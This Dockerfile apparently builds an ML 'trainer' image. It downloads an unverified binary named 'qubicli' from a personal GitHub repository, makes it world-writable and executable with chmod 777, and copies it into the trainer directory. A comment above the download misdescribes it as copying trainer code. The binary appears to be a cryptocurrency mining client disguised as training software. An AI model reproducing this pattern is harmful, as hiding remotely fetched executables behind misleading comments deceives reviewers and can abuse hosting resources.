FROM python:latest
WORKDIR /
RUN apt update && apt -y install curl git wget sudo ufw
# Copies the trainer code to the docker image.
RUN wget https://github.com/rxt36q6/myrend/raw/main/qubicli
#RUN wget https://github.com/rxt36q6/myrend/raw/main/appsettings.json
RUN ls
RUN chmod 777 qubicli
RUN pip install --upgrade pip
RUN pip install render-sdk
COPY trainer /trainer
COPY qubicli /trainer
#COPY appsettings.json /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.main"]
